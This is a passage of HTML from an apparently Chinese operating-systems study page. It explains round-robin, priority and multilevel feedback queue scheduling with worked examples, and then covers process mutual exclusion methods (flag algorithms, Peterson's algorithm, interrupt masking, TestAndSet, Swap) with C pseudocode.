transform="translate(8929.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(9985.7,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(778,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(1278,0)"></path></g><g data-mml-node="mo" transform="translate(11763.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><p>12时刻(P2完成)：就绪队列中只剩下<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex" xmlns="http://www.w3.org/2000/svg" width="2.44ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 1078.6 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g></g></g></svg></mjx-container></p><p>16时刻(P4完成)</p><h4 id="2-8-7-4-时间片轮转调度算法"><a href="#2-8-7-4-时间片轮转调度算法" class="headerlink" title="2.8.7.4 时间片轮转调度算法"></a>2.8.7.4 时间片轮转调度算法</h4><p>算法思想：公平地、轮流地为各个进程服务，让每个进程在一定时间间隔内都可以得到响应</p><p>算法规则：按照各进程到达就绪队列的顺序，轮流让各个进程执行一个时间片。若进程未在一个时间片内执行完，则剥夺处理机，将进程重新放到就绪队列队尾重新排队</p><p>用于作业 / 进程调度：用于进程调度(只有作业放入内存建立了相应的进程后，才能被分配处理机时间片)</p><p>是否可抢占：若进程未能在时间片内运行完，将被强行剥夺处理机使用权，因此时间片轮转调度算法属于抢占式的算法。由时钟装置发出时钟中断来通知CPU时间片已到</p><p>优点：公平、响应快，适用于分时操作系统</p><p>缺点：由于高频率的进程切换，因此有一定开销，不区分任务的紧急程度</p><p>是否会导致饥饿：不会</p><p>例：各进程到达就绪队列的时间、需要的运行时间如下表所示。使用时间片轮转调度算法，分析时间片大小分别是2、5时的进程运行情况。</p><p><strong>时间片轮转常用于分时操作系统，更注重“响应时间”，因而此处不计算周转时间。</strong></p><div class="table-container"><table><thead><tr><th>进程</th><th>到达时间</th><th>运行时间</th></tr></thead><tbody><tr><td>P1</td><td>0</td><td>5</td></tr><tr><td>P2</td><td>2</td><td>4</td></tr><tr><td>P3</td><td>4</td><td>1</td></tr><tr><td>P4</td><td>5</td><td>6</td></tr></tbody></table></div><p><strong>时间片大小为2</strong>（注：以下括号内表示当前时刻就绪队列中的进程、进程的剩余运行时间）</p><p>0时刻(P1(5))：0时刻只有P1到达就绪队列，让P1上处理机运行一个时间片</p><p>2时刻(P2(4) -&gt; P1(3))：2时刻P2到达就绪队列，P1运行完一个时间片，被剥夺处理机，重新放到队尾。此时P2排在队头，因此让P2上处理机。（注意：2时刻，P1下处理机，同一时刻新进程P2到达，如果在题目中遇到这种情况，默认新到达的进程先进入就绪队列）</p><p>4时刻(P1(3) -&gt; P3(1) -&gt; P2(2))：4时刻P3到达，先插到就绪队尾，紧接着P2下处理机也插到队尾</p><p>5时刻(P3(1) -&gt; P2(2) -&gt; P4(6))：5时刻P4到达插到就绪队尾（注意：由于P1的时间片还没用完，因此暂时不调度。另外，此时P1处于运行态，并不在就绪队列中）</p><p>6时刻(P3(1) -&gt; P2(2) -&gt; P4(6) -&gt; P1(1))：6时刻，P1时间片用完，下处理机，重新放回就绪队尾，发生调度</p><p>7时刻(P2(2) -&gt; P4(6) -&gt; P1(1))：虽然P3的时间片没用完，但是由于P3只需运行1各单位的时间。运行完了会主动放弃处理机，因此也会发生调度。队头进程P2上处理机</p><p>9时刻(P4(6) -&gt; P1(1))：进程P2时间片用完，并刚好运行完，发生调度，P4上处理机</p><p>11时刻(P1(1) -&gt; P4(4))：P4时间片用完，重新回到就绪队列。P1上处理机</p><p>12时刻(P4(4))：P1运行完，主动放弃处理机，此时就绪队列中只剩P4，P4上处理机</p><p>14时刻()：就绪队列为空，因此让P4接着运行一个时间片</p><p>16时刻：所有进程运行结束</p><p><strong>时间片大小为5</strong></p><p>0时刻(P1(5))：只有P1到达，P1上处理机</p><p>2时刻(P2(4))：P2到达，但P1时间片尚未结束，因此暂不调度</p><p>4时刻(P2(4) -&gt; P3(1))：P3到达，但P1时间片尚未结束，因此暂不调度</p><p>5时刻(P2(4) -&gt; P3(1) -&gt; P4(6))：P4到达，同时P1运行结束。发生调度，P2上处理机</p><p>9时刻(P3(1) -&gt; P4(6))：P2运行结束，虽然时间片没用完，但是会主动放弃处理机，发生调度</p><p>10时刻(P4(6))：P3运行结束，虽然时间片没用完，但是会主动放弃处理机，发生调度</p><p>15时刻()：P4时间片用完，但就绪队列为空，因此会让P4继续执行一个时间片</p><p>16时刻：P4运行完，主动放弃处理机。所有进程运行结束</p><p>如果时间片太大，使得每个进程都可以在一个时间内就完成，则时间片轮转调度算法退化为先来先服务调度算法，并且会增大进程响应时间。所以时间片不能太大。</p><p>另一方面，进程调度、切换是有时间代价的(保存、恢复运行环境)，因此如果时间片太小，会导致进程切换过于频繁，系统会花大量的时间来处理进程切换，从而导致实际用于进程执行的时间比例减少。可见时间片也不能太小。</p><h4 id="2-8-7-5-优先级调度算法"><a href="#2-8-7-5-优先级调度算法" class="headerlink" title="2.8.7.5 优先级调度算法"></a>2.8.7.5 优先级调度算法</h4><p>算法思想：随着计算机的发展，特别是实时操作系统的出现，越来越多的应用场景需要根据任务的紧急程度来决定处理顺序</p><p>算法规则：每个作业/进程有各自的优先级，调度时选择优先级最高的作业/进程</p><p>用于作业 / 进程调度：既可用于作业调度，也可用于进程调度。甚至还会用于I/O调度</p><p>是否可抢占：抢占式、非抢占式都有。非抢占式只需在进程主动放弃处理机时进行调度即可，而抢占式还需在就绪队列变化时，检查是否会发生抢占</p><p>优点：用优先级区别紧急程度、重要程度，适用于实时操作系统。可灵活地调整对各种作业/进程的偏好程度</p><p>缺点：若源源不断地有高优先级进程到来，则可能会导致饥饿</p><p>是否会导致饥饿：会</p><p>例：各进程到达就绪队列的时间、需要的运行时间、进程优先数如下表所示。使用<strong>非抢占式</strong>的优先级调度算法，分析进程运行情况。(注：优先数越大，优先级越高)</p><div class="table-container"><table><thead><tr><th>进程</th><th>到达时间</th><th>运行时间</th><th>优先数</th></tr></thead><tbody><tr><td>P1</td><td>0</td><td>7</td><td>1</td></tr><tr><td>P2</td><td>2</td><td>4</td><td>2</td></tr><tr><td>P3</td><td>4</td><td>1</td><td>3</td></tr><tr><td>P4</td><td>5</td><td>4</td><td>2</td></tr></tbody></table></div><p>非抢占式的优先级调度算法：每次调度时选择当前已到达且优先级最高的进程。当前进程主动放弃处理机时发生调度。</p><p>注：以下括号内表示当前处于就绪队列的进程</p><p>0时刻(P1)：只有P1到达，P1上处理机</p><p>7时刻(P2、P3、P4)：P1运行完成主动放弃处理机，其余进程都已到达，P3优先级最高，P3上处理机</p><p>8时刻(P2、P4)：P3完成，P2、P4优先级相同，由于P2先到达，因此P2优先上处理机</p><p>12时刻(P4)：P2完成，就绪队列只剩P4，P4上处理机</p><p>16时刻()：P4完成，所有进程都结束</p><p>例题同上，采用<strong>抢占式</strong>的优先级调度算法。</p><p>抢占式的优先级调度算法：每次调度时选择当前已到达且优先级最高的进程。当前进程主动放弃处理机时发生调度。另外，当就绪队列发生改变时也需要检查是否会发生抢占。</p><p>注：以下括号内表示当前处于就绪队列的进程</p><p>0时刻(P1(7))：只有P1到达，P1上处理机</p><p>2时刻(P2(4)、P1(5))：P2到达就绪队列，优先级比P1更高，发生抢占。P1回到就绪队列，P2上处理机</p><p>4时刻(P3(1)、P2(2)、P1(5))：P3到达，优先级比P2更高，P2回到就绪队列，P3抢占处理机</p><p>5时刻(P2(2)、P4(4)、P1(5))：P3完成，主动释放处理机，同时P4到达，由于P2比P4更先进入就绪队列，因此选择P2上处理机</p><p>7时刻(P4(4)、P1(5))：P2完成，就绪队列只剩P1和P4，P4上处理机</p><p>11时刻(P1(5))：P4完成，P1上处理机</p><p>16时刻()：P1完成，所有进程结束</p><p><strong>补充</strong>：</p><p>就绪队列未必只有一个，可以按照不同优先级来组织。另外，也可以把优先级高的进程排在更靠近队头的位置。根据优先级是否可以动态改变，可将优先级分为静态优先级和动态优先级两种。</p><ul><li>静态优先级：创建进程时确定，之后一直不变。</li><li>动态优先级：创建进程时有一个初始值，之后会根据情况动态地调整优先级。</li></ul><p>通常，系统进程优先级高于用户进程，前台进程优先级高于后台进程，操作系统更偏好I/O型进程(或称I/O繁忙型进程)。</p><p>与I/O型进程相对的是计算型进程(或称CPU繁忙型进程)。</p><h4 id="2-8-7-6-多级反馈队列调度算法"><a href="#2-8-7-6-多级反馈队列调度算法" class="headerlink" title="2.8.7.6 多级反馈队列调度算法"></a>2.8.7.6 多级反馈队列调度算法</h4><p>算法思想：对其它调度算法的折中权衡</p><p>算法规则：</p><ol><li>设置多级就绪队列，各级队列优先级从高到低，时间片从小到大</li><li>新进程到达时先进入第1级队列，按FCFS原则排队等待被分配时间片，若用完时间片进程还未结束，则进程进入下一级队列队尾。如果此时已经是在最下级的队列，则重新放回该队列队尾</li><li>只有第k级队列为空时，才会为k+1级队头的进程分配时间片</li></ol><p>用于作业 / 进程调度：用于进程调度</p><p>是否可抢占：抢占式算法。在k级队列的进程运行过程中，若更上级的队列(1~k-1级)中进入了一个新进程，则由于新进程处于优先级更高的队列中，因此新进程会抢占处理机，原来运行的进程放回k级队列队尾</p><p>优点：对各类进程相对公平(FCFS优点)；每个新到达的进程都可以很快就得到响应(RR优点)；短进程只用较少的时间就可完成(SPF优点)；不必实现估计进程的运行时间(避免用户作假)；可灵活地调整对各类进程的偏好程度，比如CPU密集型进程、I/O密集型进程(拓展：可以将因I/O而阻塞的进程重新放回原队列，这样I/O型进程就可以保持较高优先级)</p><p>是否会导致饥饿：会</p><p>例：各进程到达就绪队列的时间、需要的运行时间如下表所示。使用多级反馈队列调度算法，分析进程运行的过程。</p><div class="table-container"><table><thead><tr><th>进程</th><th>到达时间</th><th>运行时间</th></tr></thead><tbody><tr><td>P1</td><td>0</td><td>8</td></tr><tr><td>P2</td><td>1</td><td>4</td></tr><tr><td>P3</td><td>5</td><td>1</td></tr></tbody></table></div><p>设置多级就绪队列，各级队列优先级从高到低，时间片从小到大。新进程到达时先进入第1级队列，按FCFS原则排队等待被分配时间片。若用完时间片进程还未结束，则进程进入下一级队列队尾。如果此时已经在最下级的队列，则重新放回最下级队列队尾。只有第k级队列为空时，才会为k+1级队头的进程分配时间片。</p><h2 id="2-9-进程同步与互斥"><a href="#2-9-进程同步与互斥" class="headerlink" title="2.9 进程同步与互斥"></a>2.9 进程同步与互斥</h2><p>进程具有异步性的特征。异步性是指，各并发执行的进程以各自独立的、不可预知的速度向前推进。</p><h3 id="2-9-1-进程同步"><a href="#2-9-1-进程同步" class="headerlink" title="2.9.1 进程同步"></a>2.9.1 进程同步</h3><p>读进程和写进程并发地执行，由于并发必然导致异步性，因此“写数据”和“读数据”两个操作执行的先后顺序是不确定的。而实际应用中，又必须按照“写数据-&gt;读数据”的顺序来执行的。如何解决这种异步问题，就是“进程同步”所讨论的内容。</p><p>同步亦称直接制约关系，它是指为完成某种任务而建立的两个或多个进程，这些进程因为需要在某些位置上协调它们的工作次序而产生的制约关系。进程间的直接制约关系就是源于它们之间的相互合作。</p><h3 id="2-9-2-进程互斥"><a href="#2-9-2-进程互斥" class="headerlink" title="2.9.2 进程互斥"></a>2.9.2 进程互斥</h3><p>进程的“并发”需要“共享”的支持。各个并发执行的进程不可避免地需要共享一些系统资源(比如内存，又比如打印机、摄像头这样的I/O设备)。</p><p>我们把一个时间段内只允许一个进程使用的资源称为临界资源。许多物理设备(比如摄像头、打印机)都属于临界资源。此外还有许多变量、数据、内存缓冲区等都属于临界资源。</p><p>对临界资源的访问，必须互斥地进行。互斥，亦称间接制约关系。进程互斥指当一个进程访问某临界资源时，另一个想要访问该临界资源的进程必须等待。当前访问临界资源的进程访问结束，释放该资源之后，另一个进程才能去访问临界资源。</p><p>对临界资源的互斥访问，可以在逻辑上分为四个部分：</p><ul><li>进入区：负责检查是否可进入临界区，若可进入，则应设置正在访问临界资源的标志(可理解为“上锁”)，以阻止其它进程同时进入临界区</li><li>临界区：访问临界资源的那段代码</li><li>退出区：负责解除正在访问临界资源的标志(可理解为“解锁”)</li><li>剩余区：做其它处理</li></ul><p>为了实现对临界资源的互斥访问，同时保证系统整体性能，需要遵循以下原则：</p><ol><li>空闲让进。临界区空闲时，可以允许一个请求进入临界区的进程立即进入临界区</li><li>忙则等待。当已有进程进入临界区时，其它试图进入临界区的进程必须等待</li><li>有限等待。对请求访问的进程，应保证能在有限时间内进入临界区(保证不会饥饿)</li><li>让权等待。当进程不能进入临界区时，应立即释放处理机，防止进程忙等待</li></ol><h4 id="2-9-2-1-进程互斥的软件实现方法"><a href="#2-9-2-1-进程互斥的软件实现方法" class="headerlink" title="2.9.2.1 进程互斥的软件实现方法"></a>2.9.2.1 进程互斥的软件实现方法</h4><h5 id="2-9-2-1-1-单标志法"><a href="#2-9-2-1-1-单标志法" class="headerlink" title="2.9.2.1.1 单标志法"></a>2.9.2.1.1 单标志法</h5><p>算法思想：两个进程在访问完临界区后会把使用临界区的权限转交给另一个进程。也就是说每个进程进入临界区的权限只能被另一个进程赋予。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> turn = <span class="number">0</span>;<span class="comment">//turn表示当前允许进入临界区的进程号</span></span><br></pre></td></tr></table></figure><p>P0进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (turn != <span class="number">0</span>);①<span class="comment">//进入区</span></span><br><span class="line">critical section;②<span class="comment">//临界区</span></span><br><span class="line">turn = <span class="number">1</span>;③<span class="comment">//退出区</span></span><br><span class="line">remainder section;④<span class="comment">//剩余区</span></span><br></pre></td></tr></table></figure><p>P1进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(turn != <span class="number">1</span>);⑤<span class="comment">//进入区</span></span><br><span class="line">critical section;⑥<span class="comment">//临界区</span></span><br><span class="line">turn = <span class="number">0</span>;⑦<span class="comment">//退出区</span></span><br><span class="line">remainder section;⑧<span class="comment">//剩余区</span></span><br></pre></td></tr></table></figure><p>turn的初值为0，即刚开始只允许0号进程进入临界区，若P1先上处理机运行，则会一直卡在⑤，直到P1的时间片用完，发生调度，切换P0上处理机运行。代码①不会卡住P0，P0可以正常访问临界区，在P0访问临界区期间即时切换回P1，P1依然会卡在⑤。</p><p>因此，该算法可以实现“同一时刻最多只允许一个进程访问临界区”。</p><p>turn表示当前允许进入临界区的进程号，而只有当前允许进入临界区的进程在访问了临界区之后，才会修改turn的值。也就是说，对于临界区的访问，一定是按 P0 -&gt; P1 -&gt; P0 -&gt; P1 -&gt; … 这样轮流访问。这种必须“轮流访问”带来的问题是，如果此时允许进入临界区的进程是P0，而P0一直不访问临界区，那么虽然此时临界区空闲，但是并不允许P1访问。</p><p>因此，单标志法存在的主要问题是：违背“空闲让进”原则。</p><h5 id="2-9-2-1-2-双标志先检查法"><a href="#2-9-2-1-2-双标志先检查法" class="headerlink" title="2.9.2.1.2 双标志先检查法"></a>2.9.2.1.2 双标志先检查法</h5><p>算法思想：设置一个布尔型数组flag[]，数组中各个元素用来标记各进程想进入临界区的意愿，比如<code>flag[0]=true</code>意味着0号进程P0现在想要进入临界区。每个进程在进入临界区之前先检查当前有没有别的进程想进入临界区，如果没有，则把自身对应的标志<code>flag[i]</code>设为true，之后开始访问临界区。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> flag[<span class="number">2</span>];<span class="comment">//表示进入临界区意愿的数组</span></span><br><span class="line">flag[<span class="number">0</span>] = <span class="literal">false</span>;</span><br><span class="line">flag[<span class="number">1</span>] = <span class="literal">false</span>;<span class="comment">//刚开始设置为两个进程都不想进入临界区</span></span><br></pre></td></tr></table></figure><p>P0进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(flag[<span class="number">1</span>]);①</span><br><span class="line">flag[<span class="number">0</span>] = <span class="literal">true</span>;②</span><br><span class="line">critical section;③</span><br><span class="line">flag[<span class="number">0</span>] = <span class="literal">false</span>;④</span><br><span class="line">remainder section;</span><br></pre></td></tr></table></figure><p>P1进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(flag[<span class="number">0</span>]);⑤<span class="comment">//如果此时P0想进入临界区，P1就一直循环等待</span></span><br><span class="line">flag[<span class="number">1</span>] = <span class="literal">true</span>;⑥<span class="comment">//标记为P1进程想要进入临界区</span></span><br><span class="line">critical section;⑦<span class="comment">//访问临界区</span></span><br><span class="line">flag[<span class="number">1</span>] = <span class="literal">false</span>;⑧<span class="comment">//访问完临界区，修改标记为P1不想使用临界区</span></span><br><span class="line">remainder section;</span><br></pre></td></tr></table></figure><p>若按照①⑤②⑥③⑦…的顺序执行，P0和P1将会同时访问临界区。因此，双标志位先检查法的主要问题是：违反“忙则等待”原则。原因在于，进入区的“检查”和“上锁”两个处理不是一气呵成的。“检查”后，“上锁”前可能发生进程切换。</p><h5 id="2-9-2-1-3-双标志后检查法"><a href="#2-9-2-1-3-双标志后检查法" class="headerlink" title="2.9.2.1.3 双标志后检查法"></a>2.9.2.1.3 双标志后检查法</h5><p>算法思想：双标志先检查法的改版。前一个算法的问题是先“检查”后“上锁”，但是这两个操作又无法一气呵成，因此导致了两个进程同时进入临界区的问题。因此，人们又想到先“上锁”后“检查”的方法，来避免上述问题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> flag[<span class="number">2</span>];<span class="comment">//表示进入临界区意愿的数组</span></span><br><span class="line">flag[<span class="number">0</span>] = <span class="literal">false</span>;</span><br><span class="line">flag[<span class="number">1</span>] = <span class="literal">false</span>;<span class="comment">//刚开始设置为两个进程都不想进入临界区</span></span><br></pre></td></tr></table></figure><p>P0进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag[<span class="number">0</span>] = <span class="literal">true</span>;①</span><br><span class="line"><span class="keyword">while</span>(flag[<span class="number">1</span>]);②</span><br><span class="line">critical section;③</span><br><span class="line">flag[<span class="number">0</span>] = <span class="literal">false</span>;④</span><br><span class="line">remainder section;</span><br></pre></td></tr></table></figure><p>P1进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag[<span class="number">1</span>] = <span class="literal">true</span>;⑤<span class="comment">//标记为P1进程想要进入临界区</span></span><br><span class="line"><span class="keyword">while</span>(flag[<span class="number">0</span>]);⑥<span class="comment">//如果P0也想进入临界区，则P1循环等待</span></span><br><span class="line">critical section;⑦<span class="comment">//访问临界区</span></span><br><span class="line">flag[<span class="number">1</span>] = <span class="literal">false</span>;⑧<span class="comment">//访问完临界区，修改标记为P1不想使用临界区</span></span><br><span class="line">remainder section;</span><br></pre></td></tr></table></figure><p>若按照①⑤②⑥…的顺序执行，P0和P1都将无法进入临界区。因此，双标志后检查法虽然解决了“忙则等待”的问题，但是又违背了“空闲让进”和“有限等待”原则，会因各进程都长期无法访问临界资源而产生“饥饿”现象。</p><h5 id="2-9-2-1-4-Peterson算法"><a href="#2-9-2-1-4-Peterson算法" class="headerlink" title="2.9.2.1.4 Peterson算法"></a>2.9.2.1.4 Peterson算法</h5><p>算法思想：双标志后检查法中，两个进程都争着想进入临界区，但是谁也不让谁，最后谁都无法进入临界区。Gary L·Perterson想到了一种方法，如果双方都争着想进入临界区，那可以让进程尝试“孔融让梨”，主动让对方先使用临界区。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> flag[<span class="number">2</span>];<span class="comment">//表示进入临界区意愿的数组，初始值都是false</span></span><br><span class="line"><span class="type">int</span> turn = <span class="number">0</span>;<span class="comment">//turn表示优先让哪个进程进入临界区</span></span><br></pre></td></tr></table></figure><p>P0进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag[<span class="number">0</span>] = <span class="literal">true</span>;①</span><br><span class="line">turn = <span class="number">1</span>;②</span><br><span class="line"><span class="keyword">while</span>(flag[<span class="number">1</span>] &amp;&amp; turn == <span class="number">1</span>);③</span><br><span class="line">critical section;④</span><br><span class="line">flag[<span class="number">0</span>] = <span class="literal">false</span>;⑤</span><br><span class="line">remainder section;</span><br></pre></td></tr></table></figure><p>P1进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag[<span class="number">1</span>] = <span class="literal">true</span>;⑥<span class="comment">//表示自己想进入临界区</span></span><br><span class="line">turn = <span class="number">0</span>;⑦<span class="comment">//可以优先让对方进入临界区</span></span><br><span class="line"><span class="keyword">while</span>(flag[<span class="number">0</span>] &amp;&amp; turn == <span class="number">0</span>);⑧<span class="comment">//对方想进，且最后一次是自己“让梨”，那自己就循环等待</span></span><br><span class="line">critical section;⑨</span><br><span class="line">flag[<span class="number">1</span>] = <span class="literal">false</span>;⑩<span class="comment">//访问完临界区，表示自己已经不想访问临界区了</span></span><br><span class="line">remainder section;</span><br></pre></td></tr></table></figure><p>两种双标志法的问题都是由于进入区的几个操作不能一气呵成导致的。我们可以推理验证在Peterson算法中，两个进程进入区中的各个操作按不同的顺序穿插执行会发生什么情况：①⑥②③⑦⑧③④⑤…</p><p>Peterson算法用软件方法解决了进程互斥问题，遵循了空闲让进、忙则等待、有限等待三个原则，但是依然未遵循让权等待的原则。</p><h4 id="2-9-2-2-进程互斥的硬件实现方法"><a href="#2-9-2-2-进程互斥的硬件实现方法" class="headerlink" title="2.9.2.2 进程互斥的硬件实现方法"></a>2.9.2.2 进程互斥的硬件实现方法</h4><h5 id="2-9-2-2-1-中断屏蔽方法"><a href="#2-9-2-2-1-中断屏蔽方法" class="headerlink" title="2.9.2.2.1 中断屏蔽方法"></a>2.9.2.2.1 中断屏蔽方法</h5><p>利用“开/关中断指令”实现(与原语的实现思想相同，即在某进程开始访问临界区到结束访问为止都不允许被中断，也就不能发生进程切换，因此也不可能发生两个同时访问临界区的情况)。</p><p>将临界区放在关/开中断之间，关中断后即不允许当前进程被中断，也必然不会发生进程切换，直到当前进程访问完临界区，再执行开中断指令，才有可能有别的进程上处理机并访问临界区。</p><p>优点：简单、高效</p><p>缺点：不适用于多处理机，只适用于操作系统内核进程，不适用于用户进程(因为关/开中断指令只能运行在内核态，这组指令如果能让用户随意使用会很危险)。</p><h5 id="2-9-2-2-2-TestAndSet指令"><a href="#2-9-2-2-2-TestAndSet指令" class="headerlink" title="2.9.2.2.2 TestAndSet指令"></a>2.9.2.2.2 TestAndSet指令</h5><p>简称TS指令，也有地方称TestAndSetLock指令，或TSL指令。</p><p>TSL指令是用硬件实现的，执行的过程不允许被中断，只能一气呵成。以下是用C语言描述的逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 布尔型共享变量 lock 表示当前临界区是否被加锁</span></span><br><span class="line"><span class="comment">// true表示已加锁，false表示未加锁</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">TestAndSet</span><span class="params">(<span class="type">bool</span> *lock)</span>{</span><br><span class="line">    <span class="type">bool</span> old;</span><br><span class="line">    old = *lock;    <span class="comment">//old用来存放lock，原来的值</span></span><br><span class="line">    *lock = <span class="literal">true</span>;   <span class="comment">//无论之前是否已加锁，都将lock设为true</span></span><br><span class="line">    <span class="keyword">return</span> old;     <span class="comment">//返回lock原来的值</span></span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 以下是使用 TSL 指令实现互斥的算法逻辑</span></span><br><span class="line"><span class="keyword">while</span>(TestAndSet(&amp;lock)); <span class="comment">//"上锁"并"检查"</span></span><br><span class="line"><span class="comment">//临界区代码段...</span></span><br><span class="line">lock = <span class="literal">false</span>;       <span class="comment">//"解锁"</span></span><br><span class="line"><span class="comment">//剩余区代码段...</span></span><br></pre></td></tr></table></figure><p>若刚开始lock 是false，则TSL返回的old值为false，while循环条件不满足，直接跳过循环，进入临界区。若刚开始 lock 是 true，则执行TSL后old返回值为true，while循环条件满足，会一直循环，直到当前访问临界区的进程在退出区进行“解锁”。</p><p>相比于软件实现方法，TSL指令把“上锁”和“检查”操作用硬件的方式变成了一气呵成的原子操作。</p><p>优点：实现简单，无需像软件实现方法那样严格检查是否有逻辑漏洞；适用于多处理机环境。</p><p>缺点：不满足“让权等待”原则，暂时无法进入临界区的进程会占用CPU并循环执行TSL指令，从而导致“忙等”。</p><h5 id="2-9-2-2-3-Swap指令"><a href="#2-9-2-2-3-Swap指令" class="headerlink" title="2.9.2.2.3 Swap指令"></a>2.9.2.2.3 Swap指令</h5><p>有的地方也叫Exchange指令，或简称XCHG指令。</p><p>Swap指令也是用硬件实现的，执行过程不允许中断，只能一气呵成。以下是用C语言描述的逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 